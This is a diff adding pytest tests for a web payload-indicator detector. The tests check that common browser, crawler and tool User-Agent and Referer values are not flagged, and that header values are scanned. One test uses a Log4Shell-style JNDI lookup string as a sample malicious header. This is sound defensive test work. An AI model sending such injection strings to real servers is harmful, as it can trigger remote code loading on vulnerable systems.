@@ -252,3 +252,41 @@ def test_full_bounded_body_is_fast():
     start = time.perf_counter()
     detect_payload_indicators("/x", "", body)
     assert time.perf_counter() - start < 1.0
+
+
+BENIGN_HEADER_VALUES = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
+    "Version/18.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/131.0.0.0 Safari/537.36 Edg/131.0.2903.86",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 "
+    "(KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/131.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "curl/8.5.0",
+    "python-requests/2.32.3",
+    "Wget/1.21.4",
+    "PostmanRuntime/7.42.0",
+    "https://www.google.com/",
+    "https://www.google.com/search?q=mirage+deception+gateway&oq=mirage&sourceid=chrome&ie=UTF-8",
+    "https://shop.example.com/products?category=shoes&sort=price%20asc&page=2#reviews",
+    "https://example.com/login?next=%2Faccount%2Fsettings%3Ftab%3Dsecurity",
+    "https://t.co/AbC123xYz",
+    "android-app://com.google.android.gm/",
+]
+
+
+@pytest.mark.parametrize("value", BENIGN_HEADER_VALUES)
+def test_benign_user_agents_and_referers_not_flagged(value):
+    assert detect_payload_indicators("/", "", b"", headers=(value,)) == []
+
+
+def test_header_values_are_inspected():
+    assert detect_payload_indicators("/", "", b"", headers=("${jndi:ldap://x/a}",)) == [
+        "rce-indicator"
+    ]
